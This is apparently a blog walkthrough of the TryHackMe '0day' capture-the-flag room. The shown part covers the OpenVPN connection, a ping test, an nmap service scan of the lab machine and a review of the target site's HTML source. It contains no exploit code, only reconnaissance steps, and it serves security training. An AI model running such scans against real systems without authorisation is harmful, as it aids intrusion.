&lt;h3 id=&quot;getting-your-ovpn-file&quot;&gt;Getting your ovpn file&lt;/h3&gt;

&lt;p&gt;Tryhack me, like a lot of other similar sites uses openvpn to allow people to connect to their machines. To do this we need a configuration file that will be unique to each person. To get this file simply go to &lt;a href=&quot;https://tryhackme.com/access&quot;&gt;here&lt;/a&gt; and download your configuration file.&lt;/p&gt;

&lt;p&gt;After this you‚Äôre gonna wanna open a terminal. If you‚Äôre using a linux system (if you‚Äôre doing THM you will probably want to) then now it‚Äôs simple as:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme$ sudo openvpn --config TheMonkeyHacker.ovpn 
[sudo] password for jambot:                 
Wed Nov  4 23:15:16 2020 OpenVPN 2.4.7 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/    PKTINFO] [AEAD] built on Sep  5 2019
Wed Nov  4 23:15:16 2020 library versions: OpenSSL 1.1.1f  31 Mar 2020, LZO 2.10
Wed Nov  4 23:15:16 2020 Outgoing Control Channel Authentication: Using 512 bit message hash 'SHA512' for HMAC  authentication
Wed Nov  4 23:15:16 2020 Incoming Control Channel Authentication: Using 512 bit message hash 'SHA512' for HMAC  authentication
Wed Nov  4 23:15:16 2020 TCP/UDP: Preserving recently used remote address: [AF_INET]54.76.30.11:1194
Wed Nov  4 23:15:16 2020 Socket Buffers: R=[212992-&amp;gt;212992] S=[212992-&amp;gt;212992]
Wed Nov  4 23:15:16 2020 UDP link local: (not bound)
Wed Nov  4 23:15:16 2020 UDP link remote: [AF_INET]54.76.30.11:1194
Wed Nov  4 23:15:16 2020 TLS: Initial packet from [AF_INET]54.76.30.11:1194, sid=12d735a0 d78b38f5
Wed Nov  4 23:15:17 2020 VERIFY OK: depth=1, CN=ChangeMe
Wed Nov  4 23:15:17 2020 VERIFY KU OK
Wed Nov  4 23:15:17 2020 Validating certificate extended key usage
Wed Nov  4 23:15:17 2020 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server     Authentication
Wed Nov  4 23:15:17 2020 VERIFY EKU OK
Wed Nov  4 23:15:17 2020 VERIFY OK: depth=0, CN=server
Wed Nov  4 23:15:17 2020 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, 2048 bit RSA
Wed Nov  4 23:15:17 2020 [server] Peer Connection Initiated with [AF_INET]54.76.30.11:1194
Wed Nov  4 23:15:18 2020 SENT CONTROL [server]: 'PUSH_REQUEST' (status=1)
Wed Nov  4 23:15:18 2020 PUSH: Received control message: 'PUSH_REPLY,route 10.10.0.0 255.255.0.0,route-metric   1000,comp-lzo no,route-gateway 10.9.0.1,topology subnet,ping 5,ping-restart 120,ifconfig 10.9.55.221 255.255.0.   0,peer-id 10'
Wed Nov  4 23:15:18 2020 OPTIONS IMPORT: timers and/or timeouts modified
Wed Nov  4 23:15:18 2020 OPTIONS IMPORT: compression parms modified
Wed Nov  4 23:15:18 2020 OPTIONS IMPORT: --ifconfig/up options modified
Wed Nov  4 23:15:18 2020 OPTIONS IMPORT: route options modified
Wed Nov  4 23:15:18 2020 OPTIONS IMPORT: route-related options modified
Wed Nov  4 23:15:18 2020 OPTIONS IMPORT: peer-id set
Wed Nov  4 23:15:18 2020 OPTIONS IMPORT: adjusting link_mtu to 1625
Wed Nov  4 23:15:18 2020 Outgoing Data Channel: Cipher 'AES-256-CBC' initialized with 256 bit key
Wed Nov  4 23:15:18 2020 Outgoing Data Channel: Using 512 bit message hash 'SHA512' for HMAC authentication
Wed Nov  4 23:15:18 2020 Incoming Data Channel: Cipher 'AES-256-CBC' initialized with 256 bit key
Wed Nov  4 23:15:18 2020 Incoming Data Channel: Using 512 bit message hash 'SHA512' for HMAC authentication
Wed Nov  4 23:15:18 2020 ROUTE_GATEWAY 192.168.0.1/255.255.255.0 IFACE=wlp1s0 HWADDR=00:f4:8d:de:ea:ab
Wed Nov  4 23:15:18 2020 TUN/TAP device tun0 opened
Wed Nov  4 23:15:18 2020 TUN/TAP TX queue length set to 100
Wed Nov  4 23:15:18 2020 /sbin/ip link set dev tun0 up mtu 1500
Wed Nov  4 23:15:18 2020 /sbin/ip addr add dev tun0 10.9.55.221/16 broadcast 10.9.255.255
Wed Nov  4 23:15:18 2020 /sbin/ip route add 10.10.0.0/16 metric 1000 via 10.9.0.1
Wed Nov  4 23:15:18 2020 WARNING: this configuration may cache passwords in memory -- use the auth-nocache  option to prevent this
Wed Nov  4 23:15:18 2020 Initialization Sequence Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;testing-your-machine-is-up&quot;&gt;Testing your machine is up&lt;/h3&gt;

&lt;p&gt;Epic, so now, hopefully we should be connected to the vpn. We can test if we are by pinging our machines ip address. To get your machines IP address, go to &lt;a href=&quot;https://tryhackme.com/room/0day&quot;&gt;here&lt;/a&gt;, join the room, and then deploy the machine. After the countdown ends, you‚Äôll be given an ip address.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~$ ping 10.10.118.199
PING 10.10.118.199 (10.10.118.199) 56(84) bytes of data.
64 bytes from 10.10.118.199: icmp_seq=1 ttl=63 time=27.4 ms
64 bytes from 10.10.118.199: icmp_seq=2 ttl=63 time=30.5 ms
64 bytes from 10.10.118.199: icmp_seq=3 ttl=63 time=31.4 ms
^C
--- 10.10.118.199 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 27.379/29.764/31.423/1.729 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, now we can get started.&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;p&gt;Enumeration is literally just figuring out what‚Äôs going on, and looking for interesting stuff. We want to look at the server and see what it‚Äôs running, then from there we‚Äôll enum further, and look for versions, use vulnerability scanners etc etc.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;The first thing I always do is run an &lt;a href=&quot;https://nmap.org/&quot;&gt;nmap&lt;/a&gt; scan. There are faster scanners such as &lt;a href=&quot;https://github.com/RustScan/RustScan&quot;&gt;rustscan&lt;/a&gt; but it‚Äôs easier to install nmap and more people are familiar with it. Feel free to use your own portscanner too :). If you don‚Äôt have nmap installed it‚Äôs as simple as:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt update
sudo apt install nmap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Epic. Now that we have nmap, let‚Äôs run a basic scan, just to see what ports are open, and what the server might be doing.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ sudo nmap -sC -sV -oN nmap.txt 10.10.118.199
[sudo] password for jambot:                 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 23:21 GMT
Nmap scan report for 10.10.118.199
Host is up (0.044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pretty standard stuff, as we can see we have an apache server (running the latest apache version as of right now so likely no CVE‚Äôs there.) and an SSH server running.&lt;/p&gt;

&lt;h3 id=&quot;smol-findingsjust-looking-at-the-apache-server&quot;&gt;Smol findings/Just looking at the apache server&lt;/h3&gt;

&lt;p&gt;So, now I‚Äôm gonna look at the website, see if it has any functionality we can exploit. Normally static websites are harder to exploit as there is very little actual code running, it is often times just barebones HTML and CSS. So, if this site isn‚Äôt static- and has login forms, upload functionality etc- then we will definitely want too look for exploits in it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/0day-ryan.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, looking at the site we can see there isn‚Äôt a whole lot going on. Let‚Äôs look at the source code. Often times in easy CTF challenges, you can find useful stuff hidden in the source. In reality this isn‚Äôt really all that common- no sane devs leave passwords as a comment in source lol. Or do they &lt;a href=&quot;https://qz.com/674520/companies-are-sharing-their-secret-access-codes-on-github-and-they-may-not-even-know-it/&quot;&gt;???&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Anyways, here is the source:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width=device-width,initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;0day&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;author&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;description&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;description here&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--&amp;lt;link rel=&quot;shortcut icon&quot; href=&quot;favicon.ico&quot; type=&quot;image/vnd.microsoft.icon&quot;&amp;gt;--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://use.fontawesome.com/releases/v5.11.2/css/all.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;integrity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;crossorigin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://fonts.googleapis.com/css?family=Righteous|Ubuntu+Mono&amp;amp;display=swap&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;integrity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;crossorigin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;css/main.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;particles-js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row d-flex flex-wrap align-items-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-md-5&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;image img-fluid&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;img/avatar.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0day&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-md&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;header1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;0day&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;header3&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Ryan Montgomery&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;header2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Internet Marketer / Dev / Entrepreneur&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;link1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://instagram.com/0day&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-toggle=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tooltip&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-placement=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bottom&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Instagram&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;i&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fab fa-instagram&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;link1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://facebook.com/RyanMMontgomery&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-toggle=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tooltip&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-placement=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bottom&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Facebook&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;i&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fab fa-facebook&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;link1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://twitch.com/0day&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-toggle=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tooltip&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-placement=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bottom&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Twitch&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;i&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fab fa-twitch&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;link1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://linkedin.com/in/rapper&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-toggle=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tooltip&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-placement=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bottom&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Linkedin&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;i&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fab fa-linkedin&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;link1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://github.com/ryanrohypnol&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-toggle=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tooltip&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-placement=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bottom&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Github&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;i&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fab fa-github&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://code.jquery.com/jquery-3.3.1.slim.min.js&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;integrity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;crossorigin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;integrity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;crossorigin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;integrity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;crossorigin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;js/main.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So yea, not a whole lot going on here :p. It isn‚Äôt uncommon for CTF makers to hide things in the &lt;code class=&quot;highlighter-rouge&quot;&gt;CSS&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;JS&lt;/code&gt; files used. Or even do some &lt;a href=&quot;https://en.wikipedia.org/wiki/Steganography&quot;&gt;stego&lt;/a&gt; stuff with the images on the website. That wasn‚Äôt the case for this machine however.&lt;/p&gt;

